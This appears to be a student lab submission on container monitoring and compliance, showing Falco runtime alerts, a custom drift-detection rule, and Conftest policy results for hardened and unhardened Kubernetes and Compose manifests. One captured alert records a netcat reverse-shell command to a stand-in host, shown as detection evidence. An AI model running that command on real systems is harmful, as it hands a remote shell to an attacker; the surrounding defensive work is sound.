# Lab 9 Submission - Monitoring and Compliance

## Task 1 - Falco Runtime Detection

Falco log artifact: `labs/lab9/falco/logs/falco.log`

Custom rule artifact: `labs/lab9/falco/rules/custom-rules.yaml`

Falco setup evidence:
- Falco version in container logs: `0.43.0`
- Event source: `syscall`
- Engine: `modern BPF probe`
- Custom rules loaded from `/etc/falco/rules.d/custom-rules.yaml`

Baseline alert evidence:

```text
rule="Terminal shell in container"
priority="Notice"
time="2026-04-06T13:31:56.487154745Z"
container="lab9-helper-shell"
image="alpine:3.19"
command="sh -lc echo hello-from-entry-shell"
summary="A shell was spawned in a container with an attached terminal"
```

Event generator baseline alerts were also captured:

```text
rule="Netcat Remote Code Execution in Container"
priority="Warning"
time="2026-04-06T13:27:32.584616662Z"
container="eventgen"
command="nc -e /bin/sh example.com 22"

rule="Detect release_agent File Container Escapes"
priority="Critical"
time="2026-04-06T13:27:32.791969114Z"
container="eventgen"
file="/release_agent"

rule="Drop and execute new binary in container"
priority="Critical"
time="2026-04-06T13:27:33.364983728Z"
container="eventgen"
command="falco-event-gen"
```

Custom rule evidence:

```text
rule="Write Binary Under UsrLocalBin"
priority="Warning"
time="2026-04-06T13:30:47.954682475Z"
container="lab9-helper"
image="alpine:3.19"
file="/usr/local/bin/drift.txt"

rule="Write Binary Under UsrLocalBin"
priority="Warning"
time="2026-04-06T13:30:47.955611049Z"
container="lab9-helper"
image="alpine:3.19"
file="/usr/local/bin/custom-rule-2.txt"
```

Custom rule purpose and tuning:
- Purpose: detect container runtime drift when a process writes a new or modified file under `/usr/local/bin`.
- Trigger condition: write-style opens or creates using `open`, `openat`, `openat2`, or `creat`, with `evt.is_open_write=true`, path prefix `/usr/local/bin/`, and `container.id != host`.
- Should fire: runtime writes, truncates, or creates files under `/usr/local/bin` inside a container.
- Should not fire: host writes, read-only opens, or writes outside `/usr/local/bin`.
- Tuning guidance: if legitimate maintenance containers or build jobs write under this path, add a narrow exception by `container.name`, `container.image.repository`, or `proc.name`. Do not broadly suppress the path because it is a common binary location and drift there can become persistence.

## Task 2 - Conftest Policy-as-Code

Policy artifacts:
- `labs/lab9/policies/k8s-security.rego`
- `labs/lab9/policies/compose-security.rego`

Conftest results:

```text
unhardened Kubernetes manifest:
30 tests, 20 passed, 2 warnings, 8 failures, 0 exceptions

hardened Kubernetes manifest:
30 tests, 30 passed, 0 warnings, 0 failures, 0 exceptions

Docker Compose manifest:
15 tests, 15 passed, 0 warnings, 0 failures, 0 exceptions
```

Unhardened Kubernetes violations and risk:
- `container "juice" uses disallowed :latest tag`: `latest` is mutable, which weakens reproducibility and auditability.
- `container "juice" must set runAsNonRoot: true`: running as root increases impact if the application is compromised.
- `container "juice" must set allowPrivilegeEscalation: false`: privilege escalation can let a compromised process gain more privileges.
- `container "juice" must set readOnlyRootFilesystem: true`: writable root filesystems make runtime tampering and persistence easier.
- `container "juice" missing resources.requests.cpu`: scheduling and capacity planning are less predictable.
- `container "juice" missing resources.requests.memory`: scheduling and memory reservation are less predictable.
- `container "juice" missing resources.limits.cpu`: the container can consume excessive CPU.
- `container "juice" missing resources.limits.memory`: the container can consume excessive memory and affect node stability.
- Warnings for missing `readinessProbe` and `livenessProbe`: Kubernetes has less signal for traffic readiness and self-healing.

Hardened Kubernetes changes that satisfy the policies:
- Pins the image to `bkimminich/juice-shop:v19.0.0` instead of `:latest`.
- Adds `securityContext.runAsNonRoot: true`.
- Adds `securityContext.allowPrivilegeEscalation: false`.
- Adds `securityContext.readOnlyRootFilesystem: true`.
- Drops all Linux capabilities with `capabilities.drop: ["ALL"]`.
- Adds CPU and memory requests.
- Adds CPU and memory limits.
- Adds readiness and liveness HTTP probes on port `3000`.

Docker Compose analysis:
- Uses pinned image `bkimminich/juice-shop:v19.0.0`.
- Runs as explicit non-root user `10001:10001`.
- Sets `read_only: true`.
- Adds `tmpfs: ["/tmp"]` so expected temporary writes do not require a writable root filesystem.
- Enables `security_opt: ["no-new-privileges:true"]`.
- Drops all Linux capabilities with `cap_drop: ["ALL"]`.
- Result: all Compose policy checks pass with no warnings.

## Acceptance Criteria Mapping

- Branch: `feature/lab9`
- Falco custom rule: present in `labs/lab9/falco/rules/custom-rules.yaml`
- Falco alert evidence: present in `labs/lab9/falco/logs/falco.log`
- Conftest policy outputs: present in `labs/lab9/analysis/`
- Unhardened K8s manifest: fails as expected
- Hardened K8s manifest: passes with no warnings
- Docker Compose manifest: passes with no warnings
